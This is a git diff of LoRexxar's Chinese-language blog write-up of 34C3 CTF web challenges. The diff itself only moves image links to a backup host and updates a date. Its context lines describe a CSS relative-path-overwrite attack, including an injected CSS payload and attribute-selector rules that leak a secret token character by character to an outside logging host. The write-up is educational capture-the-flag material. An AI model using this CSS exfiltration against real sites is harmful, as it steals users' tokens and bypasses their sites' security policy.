@@ -26,20 +26,20 @@
 <meta property="og:url" content="https://lorexxar.cn/2018/01/02/34c3-writeup/index.html">
 <meta property="og:site_name" content="LoRexxar&#39;s Blog">
 <meta property="og:description" content="34c3作为ctftime很少见的高权重比赛仍然没让人失望，提供了足够好的题目质量，其中有3题是和xss有关系的，很有趣 这里整理了一下Writeup给大家">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/r67ihy6epkvcnkqvnqulsvjl/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/sgxf9gq2ni5i7osmlm17vzry/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/23ujazb8yck2rnzy9b6ow02s/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/nptyaixmrkwgizd1bce9yhe3/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/2tmhyv1f575lfz6apaeg0o4q/image.png">
-<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/9tys2vihqrm3xznatpwkjzkm/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/r67ihy6epkvcnkqvnqulsvjl/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/sgxf9gq2ni5i7osmlm17vzry/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/23ujazb8yck2rnzy9b6ow02s/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/nptyaixmrkwgizd1bce9yhe3/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/2tmhyv1f575lfz6apaeg0o4q/image.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/9tys2vihqrm3xznatpwkjzkm/image.png">
 <meta property="article:published_time" content="2018-01-02T10:03:48.000Z">
-<meta property="article:modified_time" content="2018-01-02T10:34:30.000Z">
+<meta property="article:modified_time" content="2020-09-29T06:11:23.897Z">
 <meta property="article:author" content="LoRexxar">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="xss">
 <meta property="article:tag" content="csrf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://static.zybuluo.com/LoRexxar/r67ihy6epkvcnkqvnqulsvjl/image.png">
+<meta name="twitter:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/r67ihy6epkvcnkqvnqulsvjl/image.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
@@ -459,7 +459,7 @@ height:50vh;
 <p>先放几篇文章<br><a href="http://www.thespanner.co.uk/2014/03/21/rpo/" target="_blank" rel="noopener">http://www.thespanner.co.uk/2014/03/21/rpo/</a><br><a href="http://www.zjicmisa.org/index.php/archives/127/" target="_blank" rel="noopener">http://www.zjicmisa.org/index.php/archives/127/</a></p>
 <p>这里就不专门讲述RPO的种种攻击方式，这里只讨论CSS RPO，让我们接着看看题目。</p>
 <h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><p>回到题目。</p>
-<p>整个题目站点是django写的，然后前台用nginx做了一层反代。<br><img src="http://static.zybuluo.com/LoRexxar/r67ihy6epkvcnkqvnqulsvjl/image.png" alt="image.png-135.8kB"></p>
+<p>整个题目站点是django写的，然后前台用nginx做了一层反代。<br><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/r67ihy6epkvcnkqvnqulsvjl/image.png" alt="image.png-135.8kB"></p>
 <p>然后整站带有CSP</p>
 <figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">frame-ancestors</span> <span class="string">'none'</span>; <span class="keyword">form-action</span> <span class="string">'self'</span>; <span class="keyword">connect-src</span> <span class="string">'self'</span>; <span class="keyword">script-src</span> <span class="string">'self'</span>; <span class="keyword">font-src</span> <span class="string">'self'</span> ; <span class="keyword">style-src</span> <span class="string">'self'</span>;</span><br></pre></td></tr></table></figure>
 
@@ -472,15 +472,15 @@ height:50vh;
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//35.198.114.228/urlstorage/random_str/1321321421</span></span><br><span class="line">--&gt;</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//35.198.114.228/urlstorage</span></span><br></pre></td></tr></table></figure>
 
 <p>看上去好像没什么问题，但是页面内的静态资源是通过相对路径引入的。</p>
-<p><img src="http://static.zybuluo.com/LoRexxar/sgxf9gq2ni5i7osmlm17vzry/image.png" alt="image.png-102.4kB"></p>
-<p>因为我们修改了根url，所以css的引入url变成了<br><img src="http://static.zybuluo.com/LoRexxar/23ujazb8yck2rnzy9b6ow02s/image.png" alt="image.png-158.8kB"></p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/sgxf9gq2ni5i7osmlm17vzry/image.png" alt="image.png-102.4kB"></p>
+<p>因为我们修改了根url，所以css的引入url变成了<br><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/23ujazb8yck2rnzy9b6ow02s/image.png" alt="image.png-158.8kB"></p>
 <p>我们把当前页面当做成css样式表引入到了页面内。</p>
 <p>这里我们可以通过设置url来向页面中加入一些可以控制的页面内容。</p>
 <p>这里涉及到一个小技巧：<br><strong>CSS在加载的时候与JS一样是逐行解析的，不同的是CSS会忽略页面中不符合CSS语法的行</strong></p>
 <p>也就是说如果我们设置url为<code>%0a{}%0a*{color:red}</code></p>
-<p>那么页面内容会变成<br><img src="http://static.zybuluo.com/LoRexxar/nptyaixmrkwgizd1bce9yhe3/image.png" alt="image.png-37.6kB"></p>
+<p>那么页面内容会变成<br><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/nptyaixmrkwgizd1bce9yhe3/image.png" alt="image.png-37.6kB"></p>
 <p>当引入CSS逐行解析的时候，<code>color:red</code>就会被解析</p>
-<p><img src="http://static.zybuluo.com/LoRexxar/2tmhyv1f575lfz6apaeg0o4q/image.png" alt="image.png-65.4kB"></p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/2tmhyv1f575lfz6apaeg0o4q/image.png" alt="image.png-65.4kB"></p>
 <p>通过设置可控的css，我们就可以使用一个非常特别的攻击思路。</p>
 <p>我曾经在讲述CSP的博客中提到了这种攻击思路，通过CSS选择器来读取页面内容<br><a href="https://lorexxar.cn/2017/10/25/csp-paper/#1、nonce-script-CSP-Bypass">https://lorexxar.cn/2017/10/25/csp-paper/#1、nonce-script-CSP-Bypass</a></p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[href^=flag\?token\=0]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(//l4w.io/rpo/logging.php?c=<span class="number">0</span>);&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[href^=flag\?token\=1]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(//l4w.io/rpo/logging.php?c=<span class="number">1</span>);&#125;</span><br><span class="line">..</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[href^=flag\?token\=f]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(//l4w.io/rpo/logging.php?c=f);&#125;</span><br></pre></td></tr></table></figure>
@@ -514,7 +514,7 @@ height:50vh;
 <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def login(req):</span><br><span class="line">    <span class="keyword">if</span> req.user.is_authenticated:</span><br><span class="line">        return redirect('index')</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> req.<span class="keyword">method</span><span class="operator"> == </span><span class="string">"POST"</span>:</span><br><span class="line">        username = req.<span class="module-access"><span class="module"><span class="identifier">POST</span>.</span></span>get(<span class="string">"username"</span>)</span><br><span class="line">        password = req.<span class="module-access"><span class="module"><span class="identifier">POST</span>.</span></span>get(<span class="string">"password"</span>)</span><br><span class="line">        <span class="keyword">if</span> not username <span class="keyword">or</span> not password:</span><br><span class="line">            messages.add<span class="constructor">_message(<span class="params">req</span>, <span class="params">messages</span>.ERROR, 'No <span class="params">username</span><span class="operator">/</span><span class="params">password</span> <span class="params">provided</span>')</span></span><br><span class="line">        elif len(password) &lt; <span class="number">8</span>:</span><br><span class="line">            messages.add<span class="constructor">_message(<span class="params">req</span>, <span class="params">messages</span>.ERROR, 'Password <span class="params">length</span> <span class="params">min</span> 8.')</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user, created = <span class="module-access"><span class="module"><span class="identifier">User</span>.</span></span>objects.get<span class="constructor">_or_create(<span class="params">username</span>=<span class="params">username</span>)</span></span><br><span class="line">            <span class="keyword">if</span> created:</span><br><span class="line">                user.set<span class="constructor">_password(<span class="params">password</span>)</span></span><br><span class="line">                user.save<span class="literal">()</span></span><br><span class="line">            user = auth.authenticate(username=username, password=password)</span><br><span class="line">            <span class="keyword">if</span> user:</span><br><span class="line">                user.profile.token = binascii.hexlify(os.urandom(<span class="number">16</span>)).decode<span class="literal">()</span></span><br><span class="line">                user.save<span class="literal">()</span></span><br><span class="line">                auth.login(req, user)</span><br><span class="line">                return redirect('index')</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                messages.add<span class="constructor">_message(<span class="params">req</span>, <span class="params">messages</span>.ERROR, 'Invalid <span class="params">password</span>')</span></span><br><span class="line"></span><br><span class="line">            return render(req, 'login.html')</span><br><span class="line">    return render(req, 'login.html')</span><br></pre></td></tr></table></figure>
 
 <p>所以不难想象到，如果admin的flag也随机生成，那flag就不固定了，所以admin的flag一定是写死在模板里的。</p>
-<p><img src="http://static.zybuluo.com/LoRexxar/9tys2vihqrm3xznatpwkjzkm/image.png" alt="image.png-298.5kB"></p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/9tys2vihqrm3xznatpwkjzkm/image.png" alt="image.png-298.5kB"></p>
 <p>很容易就拿到了flag。</p>
 <h1 id="superblog"><a href="#superblog" class="headerlink" title="superblog"></a>superblog</h1><p>这道题目做起来没有urlstorage有趣，但是仍然值得一做。</p>
 <p>下面的思路部分来自于<br><a href="https://blog.cal1.cn/post/34C3%20CTF%20web%20writeup" target="_blank" rel="noopener">https://blog.cal1.cn/post/34C3%20CTF%20web%20writeup</a></p>
@@ -583,7 +583,7 @@ height:50vh;
             <p>原文作者：<a href="https://lorexxar.cn">LoRexxar</a>
             <p>原文链接：<a href="https://lorexxar.cn/2018/01/02/34c3-writeup/">https://lorexxar.cn/2018/01/02/34c3-writeup/</a>
             <p>发表日期：<a href="https://lorexxar.cn/2018/01/02/34c3-writeup/">January 2nd 2018, 6:03:48 pm</a>
-            <p>更新日期：<a href="https://lorexxar.cn/2018/01/02/34c3-writeup/">January 2nd 2018, 6:34:30 pm</a>
+            <p>更新日期：<a href="https://lorexxar.cn/2018/01/02/34c3-writeup/">September 29th 2020, 2:11:23 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
